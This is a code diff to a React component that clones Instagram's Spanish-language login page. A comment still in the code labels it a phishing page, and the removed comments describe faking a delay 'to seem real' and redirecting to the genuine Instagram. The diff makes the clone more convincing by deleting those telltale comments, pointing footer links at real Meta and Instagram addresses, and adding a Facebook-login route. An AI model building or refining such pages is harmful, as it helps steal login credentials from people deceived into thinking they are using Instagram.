@@ -39,7 +39,6 @@ function LoginPage() {
       console.log('Status:', response.status);
       console.log('Headers:', Object.fromEntries(response.headers));
 
-      // Intenta obtener el texto de la respuesta primero
       const textResponse = await response.text();
       console.log('Respuesta texto:', textResponse);
 
@@ -57,13 +56,8 @@ function LoginPage() {
         throw new Error(data.error || 'Error de autenticación');
       }
 
-      // Simular delay para hacer parecer real
       await new Promise(resolve => setTimeout(resolve, 1500));
-
-      // Guardar en localStorage para simular sesión
       localStorage.setItem('instagram_session', Date.now());
-
-      // Redirigir a Instagram real
       window.location.href = data.redirectTo || 'https://www.instagram.com';
       
     } catch (error) {
@@ -150,18 +144,28 @@ function LoginPage() {
             <div className="line"></div>
           </div>
           
-          <a href="#" className="facebook-login">
+          <a href="/facebook-login" className="facebook-login">
             Iniciar sesión con Facebook
           </a>
           
-          <a href="#" className="forgot-password">
-            ¿Olvidaste tu contraseña?
-          </a>
+          <button
+            type="button"
+            className="text-blue-500 underline"
+            onClick={() => {/* lógica para recuperar contraseña */}}
+          >
+            Olvidé mi contraseña
+          </button>
         </form>
 
         <div className="signup-container">
           <p>
-            ¿No tienes una cuenta? <a href="#">Regístrate</a>
+            ¿No tienes una cuenta? <button
+              type="button"
+              className="text-blue-500 underline"
+              onClick={() => {/* lógica para registro */}}
+            >
+              Registrarse
+            </button>
           </p>
         </div>
 
@@ -175,19 +179,25 @@ function LoginPage() {
 
         <footer className="footer">
           <div className="footer-links">
-            <a href="#">Meta</a>
-            <a href="#">Información</a>
-            <a href="#">Blog</a>
-            <a href="#">Empleo</a>
-            <a href="#">Ayuda</a>
-            <a href="#">API</a>
-            <a href="#">Privacidad</a>
-            <a href="#">Condiciones</a>
-            <a href="#">Ubicaciones</a>
-            <a href="#">Instagram Lite</a>
-            <a href="#">Threads</a>
-            <a href="#">Subir contactos</a>
-            <a href="#">Meta Verified</a>
+            <a href="https://about.meta.com/">Meta</a>
+            <a href="https://about.instagram.com/">Información</a>
+            <a href="https://about.instagram.com/blog/">Blog</a>
+            <a href="https://about.instagram.com/about-us/careers">Empleo</a>
+            <button
+              type="button"
+              className="text-blue-500 underline"
+              onClick={() => {/* lógica para ayuda */}}
+            >
+              Ayuda
+            </button>
+            <a href="https://developers.facebook.com/docs/instagram">API</a>
+            <a href="https://privacycenter.instagram.com/policy/">Privacidad</a>
+            <a href="https://help.instagram.com/581066165581870">Condiciones</a>
+            <a href="https://www.instagram.com/explore/locations/">Ubicaciones</a>
+            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+            <a href="https://www.threads.net/">Threads</a>
+            <a href="https://www.instagram.com/directory/contacts/">Subir contactos</a>
+            <a href="https://www.meta.com/verified/">Meta Verified</a>
           </div>
           <div className="footer-copyright">
             {/* Botón de phishing */}
